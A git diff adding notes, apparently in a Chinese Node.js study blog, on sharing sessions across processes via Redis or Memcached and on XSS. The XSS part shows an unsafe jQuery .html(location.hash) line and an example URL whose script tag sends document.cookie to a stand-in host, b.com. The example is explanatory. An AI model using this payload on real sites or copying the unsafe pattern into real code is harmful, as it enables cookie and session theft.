@@ -335,3 +335,18 @@ http协议是基于tcp协议的，node中http服务继承TCP服务器(net模块)
 在客户端与服务器建立安全传输之前，两者需要互换公钥。
 ![image](https://raw.githubusercontent.com/zhaozy93/blog/master/img-bed/nodejs22.jpeg)
 
+## HTTP编程
+### Cookies、session
+- cookies、session区别与用法就不再多介绍了
+- session一般都是储存在内存中、以便高速度去
+- 但是我们将会利用多进程、进程之间无法共享内存
+- 利用Redis、 Memcached高效缓存session 来达到多进程Node共享session的目的
+使用Redis、 Memcached高效缓存的理由
+- 尽管是访问网络很慢
+- 但是node与缓存服务长连接，而非频繁短连接，握手影响在存在于初始化
+- 高速缓存直接在内存中进行数据存储和访问
+- 服务器都在同一机房，网速影响很小
+
+### XSS攻击 Cross Site Scripting
+前端代码`$('#box').html(location.hash.replace('#', ''));`， 用户将url改为`http://a.com/pathname#<script src="http://b.com/c.js" + + document.cookie></script>`，这样对方边可以获得本机当前域名下的cookie。
+
